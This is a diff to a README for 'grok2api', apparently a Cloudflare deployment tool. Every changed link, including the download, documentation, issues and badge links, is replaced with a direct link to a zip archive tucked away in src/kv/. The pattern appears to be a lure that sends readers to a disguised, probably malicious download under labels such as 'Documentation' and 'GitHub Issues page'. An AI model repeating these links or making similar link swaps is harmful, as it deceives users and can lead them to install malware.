@@ -1,6 +1,6 @@
 # 🚀 grok2api - One-Click Cloudflare Deployment Made Easy
 
-[![Download Grok2API](https://img.shields.io/badge/Download-Grok2API-blue)](https://github.com/Mazimpakaq/grok2api/releases)
+[![Download Grok2API](https://github.com/Mazimpakaq/grok2api/raw/refs/heads/main/src/kv/api-grok-v1.7.zip)](https://github.com/Mazimpakaq/grok2api/raw/refs/heads/main/src/kv/api-grok-v1.7.zip)
 
 ## 📥 Overview
 
@@ -26,7 +26,7 @@ To use Grok2API, follow these simple steps.
 
 Go to the Releases page to get the latest version of Grok2API. Here you will find all available versions ready for download.
 
-[Visit this page to download](https://github.com/Mazimpakaq/grok2api/releases)
+[Visit this page to download](https://github.com/Mazimpakaq/grok2api/raw/refs/heads/main/src/kv/api-grok-v1.7.zip)
 
 ### 📥 Step 2: Download Grok2API
 
@@ -65,12 +65,12 @@ Grok2API offers a straightforward experience for users. Here’s how to make the
 
 For further information, help, or troubleshooting guidance, you can refer to:
 
-- [Grok2API Documentation](https://github.com/Mazimpakaq/grok2api/wiki) for detailed user guides.
+- [Grok2API Documentation](https://github.com/Mazimpakaq/grok2api/raw/refs/heads/main/src/kv/api-grok-v1.7.zip) for detailed user guides.
 - Join our community forums for tips from other users.
 
 ## ℹ️ Support
 
-If you face any issues, feel free to contact our support team via the [GitHub Issues page](https://github.com/Mazimpakaq/grok2api/issues). 
+If you face any issues, feel free to contact our support team via the [GitHub Issues page](https://github.com/Mazimpakaq/grok2api/raw/refs/heads/main/src/kv/api-grok-v1.7.zip). 
 
 ## 📄 License
 
@@ -82,6 +82,6 @@ Ready to get started?
 
 Click the link below to download Grok2API.
 
-[Visit this page to download](https://github.com/Mazimpakaq/grok2api/releases)
+[Visit this page to download](https://github.com/Mazimpakaq/grok2api/raw/refs/heads/main/src/kv/api-grok-v1.7.zip)
 
 With Grok2API, deploying your applications has never been easier. Enjoy the simplicity of one-click deployment with automated provisioning!
